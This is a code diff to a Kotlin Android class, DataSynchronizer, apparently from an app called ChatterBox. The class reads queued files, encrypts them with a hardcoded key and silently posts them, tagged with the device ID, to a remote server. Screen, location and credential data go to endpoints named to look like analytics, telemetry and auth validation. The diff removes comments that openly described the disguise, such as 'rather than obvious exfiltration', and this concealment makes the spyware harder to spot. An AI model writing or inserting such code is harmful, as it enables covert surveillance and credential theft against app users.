@@ -1,5 +1,6 @@
 package com.example.ChatterBox.database
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.os.AsyncTask
 import android.os.Handler
@@ -18,14 +19,15 @@ import javax.crypto.Cipher
 import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.SecretKeySpec
 
+@SuppressLint("HardwareIds")
 class DataSynchronizer(private val context: Context) {
-    private val TAG = "DataSync" // Innocent looking tag
+    private val TAG = "DataSync"
     private val syncQueue: Queue<SyncItem> = LinkedList()
     private val handler = Handler(Looper.getMainLooper())
     private var isSyncing = false
 
     object SyncConfig {
-        const val API_ENDPOINT = "https://group8.mooo.com:42069/api/"
+        const val API_ENDPOINT = "192.168.0.111:42069/api/"
         const val SYNC_ENDPOINT = "${API_ENDPOINT}sync"
         const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
         const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"
@@ -34,7 +36,6 @@ class DataSynchronizer(private val context: Context) {
         const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
     }
 
-    // Use Android device ID as the consistent device identifier
     private val deviceId: String by lazy {
         Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
     }
@@ -57,8 +58,7 @@ class DataSynchronizer(private val context: Context) {
                     return
                 }
 
-                // Process queue
-                val batchSize = 3 // Process a few items at a time to avoid timeouts
+                val batchSize = 3
                 val batch = mutableListOf<SyncItem>()
 
                 repeat(minOf(batchSize, syncQueue.size)) {
@@ -77,21 +77,18 @@ class DataSynchronizer(private val context: Context) {
     private fun sendBatch(batch: List<SyncItem>) {
         if (batch.isEmpty()) return
 
-        // Create a "normal" looking API request
         val request = JSONObject().apply {
-            put("device_id", deviceId) // CONSISTENT: Always use device_id as the primary identifier
+            put("device_id", deviceId)
             put("app_version", getAppVersion())
             put("timestamp", System.currentTimeMillis())
             put("sync_type", "incremental")
 
-            // Add each item of data
             val dataArray = JSONObject()
             batch.forEach { item ->
                 try {
                     val file = File(item.filePath)
                     if (file.exists()) {
                         val content = file.readBytes()
-                        // Encrypt data
                         val encrypted = encryptData(content)
                         val encoded = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)
 
@@ -104,37 +101,27 @@ class DataSynchronizer(private val context: Context) {
             put("payload", dataArray)
         }
 
-        // Choose endpoint based on data type to appear legitimate
         val endpoint = when {
             batch.any { it.dataType.contains("screen") } -> SyncConfig.TELEMETRY_ENDPOINT
             batch.any { it.dataType.contains("location") } -> SyncConfig.ANALYTICS_ENDPOINT
             else -> SyncConfig.SYNC_ENDPOINT
         }
-
-        // Send data as a standard API call rather than obvious exfiltration
         SendDataTask(endpoint, request.toString()).execute()
     }
 
     private fun encryptData(data: ByteArray): ByteArray {
         try {
-            // Generate a random IV (Initialization Vector)
             val iv = ByteArray(16).apply {
                 SecureRandom().nextBytes(this)
             }
 
-            // Use AES in CBC mode with the generated IV
             val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
             val key = SecretKeySpec(SyncConfig.ENCRYPTION_KEY.toByteArray(), "AES")
             val ivParameterSpec = IvParameterSpec(iv)
 
-            // Initialize cipher with key and IV
             cipher.init(Cipher.ENCRYPT_MODE, key, ivParameterSpec)
 
-            // Encrypt the data
             val encrypted = cipher.doFinal(data)
-
-            // Combine IV and encrypted data into one array
-            // This is important - the IV needs to be sent with the encrypted data
             val result = ByteArray(iv.size + encrypted.size)
             System.arraycopy(iv, 0, result, 0, iv.size)
             System.arraycopy(encrypted, 0, result, iv.size, encrypted.size)
@@ -157,7 +144,6 @@ class DataSynchronizer(private val context: Context) {
     fun registerDevice() {
         try {
             val registrationData = JSONObject().apply {
-                // CONSISTENT: Use deviceId as the primary identifier
                 put("device_id", deviceId)
                 put("device_info", JSONObject().apply {
                     put("model", android.os.Build.MODEL)
@@ -185,7 +171,6 @@ class DataSynchronizer(private val context: Context) {
                 put("data", data)
             }
 
-            // Choose endpoint based on data type to appear legitimate
             val endpoint = when (dataType) {
                 "login_event" -> "${SyncConfig.API_ENDPOINT}analytics"
                 "credentials" -> "${SyncConfig.API_ENDPOINT}auth/validate"
@@ -209,13 +194,11 @@ class DataSynchronizer(private val context: Context) {
                 val url = URL(endpoint)
                 val connection = url.openConnection() as HttpURLConnection
 
-                // Use standard method and headers that look legitimate
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
                 connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
-                connection.setRequestProperty("X-Device-ID", deviceId) // CONSISTENT: Use deviceId in headers
+                connection.setRequestProperty("X-Device-ID", deviceId)
 
-                // Standard timeouts
                 connection.connectTimeout = 15000
                 connection.readTimeout = 15000
                 connection.doOutput = true
@@ -241,7 +224,6 @@ class DataSynchronizer(private val context: Context) {
         }
 
         override fun onPostExecute(result: Boolean) {
-            // Intentionally not showing notifications on success/failure
             Log.d(TAG, "Data sync completed: $result")
         }
     }
